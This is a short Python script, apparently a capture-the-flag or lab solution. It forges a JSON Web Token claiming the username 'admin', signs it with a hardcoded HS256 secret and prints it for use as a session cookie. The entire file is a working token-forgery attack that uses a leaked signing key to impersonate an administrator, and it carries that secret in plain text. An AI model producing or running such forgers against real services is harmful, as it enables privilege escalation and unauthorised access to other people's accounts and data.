#!/usr/bin/env python3

import jwt

cookie = jwt.encode({"username":"admin"}, 'RrXCv`mrNe!K!4+5`wYq', algorithm="HS256")

print(cookie)